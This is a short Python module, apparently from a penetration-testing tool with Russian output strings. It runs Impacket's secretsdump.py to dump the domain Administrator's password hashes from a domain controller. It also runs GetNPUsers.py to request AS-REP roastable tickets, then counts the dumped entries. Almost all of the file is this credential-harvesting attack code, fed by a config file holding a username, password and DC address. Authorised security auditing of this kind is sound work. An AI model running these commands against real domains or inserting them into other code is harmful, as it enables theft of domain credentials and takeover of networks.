from config import CONFIG
from utils.runner import run_tool

def parse_impacket(out: str):
    hashes = out.count("::")
    return {"hashes_found": hashes, "summary": f"Дамп хэшей/тикетов: {hashes} записей"}

def run_impacket_check():
    cmd1 = ["secretsdump.py", f"{CONFIG['username']}:{CONFIG['password']}@{CONFIG['dc_ip']}", "-just-dc-user", "Administrator"]
    res1 = run_tool(cmd1, "secretsdump (DC)", parse_impacket)
    
    cmd2 = ["GetNPUsers.py", f"{CONFIG['domain']}/{CONFIG['username']}:{CONFIG['password']}", "-dc-ip", CONFIG['dc_ip'], "-request"]
    res2 = run_tool(cmd2, "GetNPUsers (AS-REP)", parse_impacket)
    
    return {
        "tool": "Impacket Tools",
        "status": "success",
        "data": {"subresults": [res1, res2]}
    }